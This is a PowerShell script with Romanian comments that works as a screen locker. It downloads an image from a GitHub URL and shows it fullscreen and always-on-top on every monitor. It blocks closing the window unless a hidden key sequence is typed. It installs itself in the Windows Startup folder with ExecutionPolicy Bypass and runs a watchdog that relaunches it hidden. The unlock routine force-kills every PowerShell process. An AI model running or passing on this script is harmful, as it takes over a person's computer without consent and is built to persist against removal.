# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        # Blochează închiderea
        $form.FormClosing += {
            param($sender, $eventArgs)
            if (-not $global:exitFlag) {
                $eventArgs.Cancel = $true
            }
        }

        $forms += $form
    }

    # Eveniment pentru ascultarea tastelor
    $global:keySequence = ""
    $forms[0].Add_KeyDown({
        param($sender, $eventArgs)
        $global:keySequence += $eventArgs.KeyChar
        if ($global:keySequence -like "*cdr") {
            Stop-All
        }
    })

    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Funcție pentru oprirea completă a aplicației
function Stop-All {
    $global:exitFlag = $true
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    exit
}

# Configurare pornire automată
function Set-Startup {
    $scriptPath = $MyInvocation.MyCommand.Path
    $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
    $batContent = "@echo off`nstart /min powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
    Set-Content -Path $batFilePath -Value $batContent -Force
}

# Monitorizare pentru persistență
function Monitor-Process {
    while ($true) {
        if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
            Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$MyInvocation.MyCommand.Path`"" -WindowStyle Hidden
            exit
        }
        Start-Sleep -Seconds 1
    }
}

# Executare funcționalități
Download-Image
Set-Startup
Start-Job -ScriptBlock { Monitor-Process }
Show-FullScreenImage
